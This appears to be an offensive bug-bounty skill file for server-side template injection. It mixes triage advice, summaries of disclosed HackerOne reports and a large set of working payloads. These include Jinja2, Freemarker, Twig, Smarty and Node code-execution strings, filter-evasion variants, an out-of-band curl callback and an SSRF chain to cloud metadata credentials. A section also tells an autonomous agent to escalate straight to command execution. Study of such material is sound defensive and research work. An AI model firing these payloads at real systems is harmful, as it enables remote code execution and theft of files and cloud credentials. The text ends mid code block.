5. **Vulnerable dependency or unpatched appliance** — lodash 4.17.15 shipped with an unsafe `_.template` (`#904672`, CVSS 8.6); Confluence CVE-2019-3396 was left unpatched on an internet-facing host (`#536130`, critical/$2,000). Neither requires the application developer to have written a bad template at all.

6. **Client/server trust boundary confusion** — AngularJS `{{...}}` evaluated client-side produces XSS, not RCE (`#125027`, `#230234`, `#250837`, `#1736317`, `#1265344`). Teams and researchers both mislabel these; correct classification matters for triage and severity.

7. **Length limits mistaken for mitigation** — a 30-character cap blocks the one-liner but leaves detection (`{{ '7'*7 }}`), class enumeration, and compact loop primitives fully intact (`#125980`). The report still earned $10,000.

8. **Template-editor preview without isolation** — `template-action=preview` renders attacker input on the server with production privileges; the "preview" is effectively an RCE endpoint (`#423541`). The test-email button is part of the attack surface, not a convenience.

9. **Unverified email ownership amplifies stored CCTI** — `#250837` noted the site allowed creating an account with someone else's email, turning a self-XSS into an attack on a future victim. Always check the enrollment flow when triaging stored template injection.

---

## Bypass Techniques

### Engine Syntax Switching (the primary "bypass")
```
{{7*7}} fails / literal  → try ${7*7}, #{7*7}, {7*7}, <%= 7*7 %>, *{7*7}
Jinja2 payload blocked   → it may be Twig; use {{7*'7'}} to fork
Twig sandbox mode        → sandboxed SSTI is Medium/XSS, not Critical RCE
Freemarker: {{...}} does NOTHING → use ${...} and <#assign ... ?new()>
Smarty: {{7*7}} is meaningless  → use {7*7} and {php}
```

### Jinja2 WAF / Filter Evasion
```
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
{%print(  ...  )%}                       # print tag when {{ }} is filtered
{{config.__class__.__init__.__globals__['o'+'s'].popen('id').read()}}   # string split
Unicode escapes / concatenation to break blocked literals like __class__, popen, os
Length caps → staged enumeration via __subclasses__()[INDEX] (see #125980)
Compact loops → {%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
```

### Content-Type / Encoding
```
Form endpoint → send application/x-www-form-urlencoded, NOT JSON
JSON endpoint → send application/json with the payload as a string value
Email field   → append payload to a valid address: sudo_bash{{8*8}}@wearehackerone.com (#1265344)
Subject line  → "49, welcome to Glovo!" — check mail headers AND body (#1104349)
Multiple fields → inject all candidate name fields at once, then bisect (#164224)
```

### CMS Template Editor
```
Keep record id in QUERY: POST /template?productId=N  (body id → 400 "Missing product id")
Body: csrf=<FRESH>&template=<PAYLOAD>&template-action=preview
Re-GET the editor to refresh CSRF each iteration; save only when payload is confirmed
Freemarker editor RCE: <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Class-Walker Index Hunting (Jinja2)
```
{{ ''.__class__.__mro__[1].__subclasses__() }}      # dump the list
# find index of subprocess.Popen / os._wrap_close / warnings.catch_warnings
{{ ''.__class__.mro()[1].__subclasses__()}}          # #125980's exact form
{{ ''.__class__.mro()[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```

### Node / Prototype Chain
```
{{ this.__proto__.constructor.constructor('return process')().env }}   # prototype walk to process
${JSON.stringify(process.env)}                                         # lodash _.template
{{ this.__proto__.constructor.name }} → Object                          # confirm reachability
```

### When the Reflection Is in an Attribute
```
<input value="{{7*7}}">   → arithmetic may be swallowed; use a string probe instead:
{{ '7'*7 }}  or  {{ 7*7|string }}  or a unique marker with a trailing char
Also check the raw message source for email sinks; renderers may strip tags
```

### Error-Driven Escalation
```
A template error is a positive fingerprint, not a dead end:
{7*7} error → {$smarty.version} → {php}print "Hello"{/php} → file_get_contents
500 from <!--#config ...--> → SSI processor confirmed (#413655)
```

### Blind / Callback Confirmation
```
popen('curl https://YOUR_ID.oast.fun/{{unique}}')      # unique marker per attempt
system("sleep 10")  + time the response                  # #3584149
Check for mail-queue delays before declaring a blind sink inert
```

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Return command output (`uid=...`) in the response/raw email, OR show a unique OAST/DNS callback triggered by `popen`/`system` (`#3584149`).
   - Show the **exact engine** in the fingerprint (`7777777` vs `49`, `{$smarty.version}`, `${7*7}`+`#{7*7}`).
   - "Arithmetic evaluated" alone is only proof of injection, not of impact. If the engine is sandboxed, downgrade.
   - For file-read chains, show the actual file content (`/etc/passwd` bytes from `#164224`), not just that the tag executed.
   - For CCTI, show `alert(document.domain)` executing in a victim-reachable context, not only in your own session.

2. **What does the victim LOSE?**
   - OS command execution on the render worker → internal-network pivot (2 full reports carry this signal).
   - Source-code / environment disclosure (`${JSON.stringify(process.env)}`, `#904672`).
   - Arbitrary file read (`file_get_contents('/etc/passwd')`, `#164224`).
   - For CCTI cases: is it self-XSS only (`#250837` calls out the no-email-verification account-creation attack that makes it exploitable against others), or genuinely reflected against victims (`#125027`, `#230234`, `#1736317`)?
   - If the answer is only "the number 49 appeared," severity is low — quantify the reachable primitive.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Does the email still arrive with the evaluated payload (not cached/one-time)?
   - Is the render sync (response) or async (mail queue — wait and re-check)?
   - Can a second person register a fresh account, set the field, and get the same `uid=...` or callback?
   - For template editors: does `template-action=preview` reproduce without needing `save`?
   - Does the exploit survive a fresh CSRF token and a new session?

### Common false positives to reject before submission

- `{{7*7}}` echoed **literally** in an error message ("invalid template: {{7*7}}") — no evaluation occurred.
- Arithmetic evaluated **client-side** by Angular with no server render — classify as XSS (`hunt-xss`) instead.
- A `500` with no engine fingerprint and no evaluated output — a crash is not RCE; find the error text or a callback.
- Self-XSS in a profile field with no victim-reachable path — find the amplification (`#250837`) or downgrade.
- A known CVE you have not actually confirmed against the live version — verify the patch level first (`#536130`).

---

## Real Impact Examples

### Scenario A: Profile Name → Jinja2 RCE in Confirmation Email (Uber Pattern, #125980, $10,000)
The researcher changed the profile name on rider.uber.com to `{{ '7'*7 }}`. The mail "Your Uber account information has been updated" from support@uber.com arrived with the name rendered as `7777777` in the body — proving Flask/Jinja2 server-side evaluation. A length limit blocked the full `os.popen` one-liner, so the escalation path was staged class enumeration (`{{ [].__class__.__base__.__subclasses__() }}` → pick gadget index → `communicate()`) plus compact loop primitives. The sink was the **email**, invisible in the web UI; the finding was RCE on the mail-rendering worker, not a cosmetic reflection. Lesson: a constrained input field plus a readable email sink is still a critical finding.

### Scenario B: Email Template Editor → Prototype Chain Disclosure (Shopify Return Magic Pattern, #423541, 408 upvotes)
Inside the Return Magic app's workflow email editor, setting the template to `{{this}}` produced `[Object Object]` in the test email; `{{this.__proto__}}` did the same, and `{{this.__proto__.constructor.name}}` returned `Object`. This disclosed a traversable Node.js object graph inside the template context — a prototype-pollution-adjacent primitive reachable by any shop admin who could edit workflow templates and send a test mail. Even without a completed RCE chain, the report's 408 upvotes reflect the recognized severity of template-context object access, and the `admin-internal` signal reminds us that authenticated surfaces count.

### Scenario C: Smarty `{php}` Tags → Arbitrary File Read (Unikrn Pattern, #164224)
The researcher put `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}` into firstname/lastname/nickname and invited a friend. The invite email executed the tag and dumped the first 100 bytes of `/etc/passwd`. The progression was textbook: `{7*7}` → template error (fingerprint), `{$smarty.version}` → version, `{php}print "Hello"{/php}` → confirm code execution, then file read. A single profile field became server-side code execution with file-read impact. The researcher did not know which of the three name fields was the sink — injecting all of them and bisecting is the right move.

### Scenario D: Reflected Arithmetic → CCTI/XSS vs True SSTI (Uber developer / WordPress mercantile Patterns)
`?q=wrtz{{7*7}}` on developer.uber.com produced `wrtz49` in rendered source, escalated with an AngularJS sandbox escape to `alert(1)` (`#125027`, $3,000). WordPress mercantile showed `{{2*2}}` → `4` in the site title and `{{constructor.constructor('alert(document.domain)')()}}` → XSS (`#230234`). The same site also stored `{{constructor.constructor('alert(1)')()}}` in an account name via `/my-account/edit-address/` (`#250837`), with the researcher explicitly working around the self-XSS limitation by abusing unverified email ownership. DoD News/Speeches showed `?Search={{7*7}}` → `49` embedded into the page (`#1736317`). These are **client-side** template injections: real XSS, not server RCE. Correct classification is the difference between an accurate Medium and a rejected Critical.

### Scenario E: Known-CVE Appliance → Instant Critical (Mail.ru Pattern, #536130, critical/$2,000)
No fuzzing was required: an internet-facing Atlassian Confluence instance in the ESForce domain was running unpatched CVE-2019-3396 (plus related issues). The finding was graded critical with a $2,000 bounty. The lesson is procedural — maintain a version-check pass for public appliances with known template-injection CVEs before investing in manual probes.

### Scenario F: Library Sink → Environment Disclosure (lodash Pattern, #904672, CVSS 8.6)
The researcher reviewed the lodash 4.17.15 source and found that `_.template` did not validate user-supplied input; an application passing a request parameter into it would execute injected JavaScript such as `parameter=${JSON.stringify(process.env)}`. Because lodash had ~26.6 million weekly downloads, the finding propagated to every downstream consumer that used the function unsafely. Source review plus dependency version pinning turned a library bug into a widely applicable SSTI primitive.

### Scenario G: Signup Field → Subject-Line Eval and Self-DoS (Glovo / Acronis Patterns)
Glovo's report (`#1104349`) shows that the sink is not always a body: the welcome/promotional email arrived with the subject `49, welcome to Glovo!` after `{{7*7}}` was placed in the First Name field at registration. Acronis (`#1265344`) shows the same class on a password-reset form, with `sudo_bash{{8*8}}@wearehackerone.com` reflected in the page and the researcher noting "AngularJs CCTI may lead to xss." Pair these two habits: check **subject lines as well as bodies**, and **classify Angular reflections as client-side** rather than assuming server-side evaluation. Together they prevent both a missed finding and a mis-scored one.

---

## Disclosed Report Citations

19 real reports cited — 14 read in full. Every citation below is a real HackerOne report from the study pack or the TOP-SSTI list. No IDs or URLs were invented.

**Shopify — H1514 Server Side Template Injection in Return Magic email templates?** ([H1 #423541](https://hackerone.com/reports/423541)) — Node.js email-template SSTI, prototype-chain walk, 2018 / $0, 408 upvotes.
  - Technique: `{{this}}` → `[Object Object]`, `{{this.__proto__.constructor.name}}` → `Object` in workflow test email.
  - Root cause: untrusted template body rendered in an admin email editor; object graph reachable.

**Mail.ru — Path traversal, SSTI and RCE on a MailRu acquisition** ([H1 #536130](https://hackerone.com/reports/536130)) — Atlassian Confluence CVE-2019-3396 misconfiguration, path traversal → RCE, 2019 / critical, $2,000.
  - Technique: version-check on a public Confluence instance, then documented exploit chain.
  - Root cause: unpatched internet-facing appliance.

**Unikrn — Urgent: Server side template injection via Smarty template allows for RCE** ([H1 #164224](https://hackerone.com/reports/164224)) — Smarty `{php}` tags via profile fields → invite email, `file_get_contents('/etc/passwd')`, 2016 / $0, 122 upvotes.
  - Technique: `{7*7}` → error, `{$smarty.version}`, `{php}print "Hello"{/php}`, then file read.
  - Root cause: profile firstname/lastname/nickname composed into the invite-email template.

**HubSpot — Reflected XSS and Server Side Template Injection in all HubSpot CMSes** ([H1 #399462](https://hackerone.com/reports/399462)) — CMS SSTI + reflected XSS, no bounty disclosed, 64 upvotes.
  - Technique: template injection across HubSpot CMS properties; classified with both SSTI and XSS impact.
  - Root cause: CMS rendering of user-controlled content.

**GitHub Security Lab — Python: Add query to detect Server Side Template Injection** ([H1 #944359](https://hackerone.com/reports/944359)) — Semmle/CodeQL static-analysis detection query for Python SSTI sinks, no bounty.
  - Technique: data-flow query identifying tainted input reaching template compile/render calls.
  - Use: mirror the sink patterns when reviewing Python source.

**Glovo — Server Side Template Injection on Name parameter during Sign Up process** ([H1 #1104349](https://hackerone.com/reports/1104349)) — Jinja2 SSTI via First Name → welcome email subject `49, welcome to Glovo!`, 2021 / High, $0, 26 upvotes.
  - Technique: `{{7*7}}` in First Name at registration; evaluated output in the promotional email subject.
  - Root cause: server-side render of the signup name into the welcome template.

**curl — SSTI leads to Command injection** ([H1 #3584149](https://hackerone.com/reports/3584149)) — `os` parameter → `popen('sleep 10')` / `system(...)` with OAST callback, 2026 / $0, 24 upvotes.
  - Technique: `curl -os{system("sleep 10")}.read --url <oast>` → 200 + 10s delay.
  - Root cause: option-like parameter reaching a shell/brace-expansion context.

**GitHub Security Lab — [Ruby]: Server Side Template Injection** ([H1 #1928279](https://hackerone.com/reports/1928279)) — Ruby/ERB SSTI detection research, $2,300.
  - Technique: static analysis of Ruby taint flows into `render inline:`/`ERB.new` sinks.
  - Use: source-review pattern for Rails ERB injection.

**GitHub Security Lab — CodeQL query to detect Server-Side Template Injections (JavaScript)** ([H1 #894872](https://hackerone.com/reports/894872)) — CodeQL JavaScript SSTI sink detection query, no bounty.
  - Technique: taint tracking into JS template compilers such as `_.template`.
  - Use: pair with the lodash finding (`#904672`).

**Node.js third-party modules — Server-side Template Injection in lodash.js** ([H1 #904672](https://hackerone.com/reports/904672)) — `_.template` 4.17.15 code injection, `${JSON.stringify(process.env)}` env disclosure, 2020 / High, CVSS 8.6.
  - Technique: unvalidated parameter passed to `_.template` executes injected JavaScript.
  - Root cause: library function does not validate user-supplied template input.

**Ruby on Rails — Server-side template injection at ujs test server** ([H1 #942103](https://hackerone.com/reports/942103)) — `render inline: params[:content]` → ERB RCE, public source review, 2020 / $0.
  - Technique: `render inline: params[:content]` with `<% \`touch me\` %>` / `<%= \`id\` %>`.
  - Root cause: request parameter rendered directly as ERB.

**GitHub Security Lab — Java: Add query to detect Server Side Template Injection (SSTI)** ([H1 #1490372](https://hackerone.com/reports/1490372)) — CodeQL Java SSTI sink detection query, no bounty.
  - Technique: taint tracking into Freemarker/Velocity/Thymeleaf render calls.
  - Use: source-review pattern for Java template engines.

**Uber — uber.com may RCE by Flask Jinja2 Template Injection** ([H1 #125980](https://hackerone.com/reports/125980)) — Jinja2 SSTI via profile-name → confirmation email (`{{ '7'*7 }}` → `7777777`), length-limited class-walker RCE, 2016 / $10,000.
  - Technique: short string-repetition probe, `__subclasses__()` enumeration, loop primitive.
  - Root cause: profile name composed into a Jinja2 confirmation-email template.

**Uber — Reflected XSS on developer.uber.com via Angular template injection** ([H1 #125027](https://hackerone.com/reports/125027)) — AngularJS CCTI, `?q=wrtz{{7*7}}` → `wrtz49`, IE11 sandbox escape, 2016 / $3,000.
  - Technique: `{{(_="".sub).call.call(...)}}` prototype-based sandbox escape to `alert(1)`.
  - Classification: client-side XSS, not server RCE.

**WordPress — [mercantile.wordpress.org] Reflected XSS via AngularJS Template Injection** ([H1 #230234](https://hackerone.com/reports/230234)) — CCTI in `/search/`, `{{2*2}}` → `4` in site title, `constructor.constructor('alert(1)')()`, 2017 / Medium.
  - Technique: arithmetic probe in path segment, escalation via `constructor.constructor(...)`.
  - Classification: client-side reflected XSS.

**WordPress — Stored xss via template injection** ([H1 #250837](https://hackerone.com/reports/250837)) — stored AngularJS CCTI via account name, `{{constructor.constructor('alert(1)')()}}`, self-XSS made exploitable via unverified account email, 2017 / High.
  - Technique: payload stored through `/my-account/edit-address/`, triggers on account page view.
  - Amplification: account creation with another person's unverified email.

**Acronis — Self-DoS due to template injection via email field in password reset form** ([H1 #1265344](https://hackerone.com/reports/1265344)) — AngularJS CCTI via mail field `sudo_bash{{8*8}}@wearehackerone.com`, reflected output / DoS signal, 2021 / $0.
  - Technique: arithmetic probe embedded in an email-address field; reflected on `/reset_password/new`.
  - Classification: client-side injection, impact noted as possible XSS / resource issue.

**U.S. Dept Of Defense — XSS via Client Side Template Injection on /News/Speeches** ([H1 #1736317](https://hackerone.com/reports/1736317)) — CCTI in `Search` param, `{{7*7}}` → `49`, JS eval → XSS, 2022 / Medium.
  - Technique: `?Search={{7*7}}` evaluated to `49` and embedded into the page; JS in braces executed.
  - Classification: client-side template injection → XSS.

**Semmle — Server side includes in savePublicInformation leads to 500 server error and D-DOS** ([H1 #413655](https://hackerone.com/reports/413655)) — SSI injection `<!--#config timefmt="..."-->` in location field → 500/DoS, 2018 / Low.
  - Technique: SSI directive in `location` of an authenticated `savePublicInformation` POST.
  - Root cause: improper sanitization in a server-side-include-processing endpoint.

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the shortest path to RCE on Python/Ruby/PHP/Java stacks: the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → command execution as the render worker. Always escalate fingerprint → class-walker → command execution; see `#125980` and `#164224`.

- **`hunt-xss`** — When the engine is client-side (AngularJS) or sandboxed, the same `{{7*7}}` reflection yields XSS instead of RCE. Chain primitive: CCTI `{{constructor.constructor('alert(1)')()}}` → reflected/stored XSS (`#125027`, `#230234`, `#250837`, `#1736317`, `#1265344`). Check self-XSS amplification via weak account enrollment (`#250837`).

- **`hunt-ssrf`** — Template engines often expose URL fetchers before the runtime. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` → cloud metadata → IMDS token. Treat SSRF as the fallback when class-walkers are blocked.

- **`hunt-file-upload`** — Office docs, SVGs, and uploaded email templates are re-rendered server-side. Chain primitive: a DOCX `word/document.xml` containing `${T(java.lang.Runtime).getRuntime().exec("id")}` through a Velocity/Freemarker mail-merge → RCE.

- **`hunt-cloud-misconfig`** — Once SSTI gives RCE on the render worker, check IMDS and internal-only endpoints from that host (the `internal-network` signal appears in 2 full reports).

- **`security-arsenal`** — Load the engine-specific escape tree: Jinja2 `__subclasses__()[N]` index hunting, Twig `_self.env`, Freemarker `?new()`, ERB backticks, Velocity `$class.inspect`, Smarty `{php}`, plus WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).

- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. `{{7*7}} → 49` in a sandboxed or client-side engine is Medium SSTI/XSS, not Critical RCE. Prove `id` output or a unique OAST callback before submitting.


---

## Merged Source Knowledge

This section consolidates **32 unique knowledge blocks** from 2 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (32 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-ssti/SKILL.md`

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.


### From `offensive-skills/offensive-ssti/SKILL.md`

## Metadata
- **Skill Name**: ssti
- **Folder**: offensive-ssti
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/ssti.md

## Description
Server-Side Template Injection testing checklist: template engine identification (Jinja2, Twig, Freemarker, Pebble, Velocity), polyglot detection payloads, engine-specific RCE payloads, blind SSTI, and filter bypass. Use when testing web apps for template injection vulnerabilities.

## Trigger Phrases
Use this skill when the conversation involves any of:
`SSTI, server-side template injection, Jinja2, Twig, Freemarker, Pebble, Velocity, template injection, template RCE, polyglot payload, template engine, blind SSTI`

# Server-Side Template Injection (SSTI)

Template engines are software used to generate dynamic web pages. When user input is unsafely embedded into templates, server-side template injection (SSTI) can occur, potentially leading to Remote Code Execution (RCE).

## Shortcut

- Look for all locations where user input is reflected or used in the response (URL parameters, POST data, HTTP headers, JSON data, etc.).
- Inject template syntax characters/polyglots like `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}` into inputs. Check for errors, mathematical evaluation (e.g., `49` instead of `7*7`), or missing/changed reflections.
- Verify server-side evaluation (e.g., math works) vs. client-side XSS.
- Use engine-specific syntax (e.g., `${7/0}`, `{{7/0}}`, `<%= 7/0 %>`), known variable names (`{{config}}`, `{$smarty}`), or error messages to identify the template engine (use a decision tree like PortSwigger's or HackTricks').
- Look up payloads specific to the identified engine and backend language.
- Use engine-specific payloads (see Methodologies) to read files, execute commands, access internal data, or escape sandboxes.
- Create a non-destructive proof of concept (e.g., `touch ssti_poc_by_YOUR_NAME.txt` via RCE).

## Mechanisms

Server-Side Template Injection (SSTI) occurs when attacker-controlled input is embedded unsafely into a server-side template. Instead of treating the input as data, the template engine executes it as part of the template's code. This allows injecting template directives to execute arbitrary code, access server data, or perform actions as the application.

**Root Cause:** Concatenating or directly rendering user input within a template string without proper sanitization or using insecure template functions.

- Misusing “helper” APIs that compile raw strings at runtime, such as `render_template_string`, `Template::render_inline`, or `Template.compile`, which appear safe but execute attacker‑supplied data.

### Vulnerable Example 1 (Simple Jinja2)

The following program takes user input and concatenates it directly into a template string:

```python

# Assume user_input comes from an HTTP request parameter
from jinja2 import Template
tmpl = Template("<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

If `user_input` is `{{1+1}}`, the engine executes the expression:

```html
<html>
  <h1>The user's name is: 2</h1>
</html>
```

### Vulnerable Example 2 (Flask/Jinja2)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    # Vulnerable: Directly renders user input from 'user' query parameter
    if request.args.get('user'):
        return render_template_string('Welcome ' + request.args.get('user'))
    else:
        return render_template_string('Hello World!')

### Secure Example (Flask/Jinja2)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    # Secure: Passes user input as a variable to the template
    if request.args.get('user'):
        # The template engine treats 'username' as data, not code
        return render_template_string('Welcome {{ username }}', username=request.args.get('user'))
    else:
        # ...
```

### Preparation

- Identify all user-controlled input points: URL parameters, POST data, HTTP headers (Referer, User-Agent, custom headers), JSON keys/values, etc.
- Use tools like `waybackurls` and `qsreplace` to generate fuzzing lists for parameters:
  ```bash
  waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
  ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"
  # Check Burp Repeater/Logger++ for responses containing the evaluated result (e.g., 81)
  ```

### Detection

- Initial Fuzzing: Inject basic polyglots: `${{<%[%'"}}%\`, `{{7*'7'}}`, `{{7*7}}`, `${7*7}`, **quote‑less payloads** such as `{{[].__class__.__mro__[1]}}`.
- Observe Behavior:
  - Errors: Stack traces or specific error messages can reveal the template engine (e.g., Jinja2, Smarty, FreeMarker).
  - Evaluation: Input like `{{7*7}}` becomes `49`.
  - Blank Output: The payload might be processed and removed if invalid or if it performs an action without output.
  - No Change: Input reflected exactly as provided; likely not vulnerable (or requires different syntax).
- Differentiate from XSS: Ensure the evaluation happens server-side, not client-side. `${7*7}` evaluating to `49` strongly suggests SSTI.

#### Engine-Specific Payloads

Use a systematic approach based on the initial observations or a decision tree ([PortSwigger, updated July 2024](https://portswigger.net/research/server-side-template-injection), [Medium](https://miro.medium.com/v2/resize:fit:1100/format:webp/1%2A35XwCGeYeKYmeaU8rdkSdg.jpeg)).

#### Additional Common Engines (2024‑2025)

| Engine                           | Fingerprint                                         | Simple RCE / Info payload                                         |
| -------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------- |
| **Mako** (Python/Pyramid)        | Error message containing `mako.exceptions`          | `${self.module.os.popen('id').read()}`                            |
| **Blade** (Laravel 11)           | `Undefined variable` or `@dd($loop)` dumps          | `{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}`    |
| **Groovy / GSP**                 | Stack trace with `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>`     |
| **Tera / Askama (Rust)**         | Files ending `.tera` / `.askama.rs`                 | No generic RCE yet; watch for logic injection                     |
| **EJS / Pug (Node)**             | `.ejs`, `.pug` templates                            | Often needs gadget via helpers/filters; prototype chains          |
| **Twig (PHP)**                   | Error mentions `Twig\\`                             | `{% for k,v in _self %}` info, RCE via unsafe extensions          |
| **Liquid** (Shopify/Ruby)        | `{{product.title}}`, errors mention `Liquid::`      | Limited by default; see Liquid-specific payloads below            |
| **Nunjucks** (Node/Mozilla)      | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
| **Handlebars** (Node)            | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
| **Thymeleaf 3.1+** (Java/Spring) | `th:text="${...}"`, Spring Boot stack traces        | `${T(java.lang.Runtime).getRuntime().exec('id')}` if SpEL enabled |

#### Variable Probing

Try injecting known variables for common frameworks: `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`.

### Character Blacklist Bypass

- Use alternative syntax: `getattr(object, 'attribute')` instead of `object.attribute`. Use `{{request|attr('application')}}` instead of `{{request.application}}`.
- Use array/dictionary access: `request['application']` instead of `request.application`.
- Hex/Octal Encoding (if interpreted server-side): `request['\x5f\x5fglobals\x5f\x5f']` instead of `request['__globals__']`.
  ```python
  # Example: Bypass '.' and '_' using brackets and hex
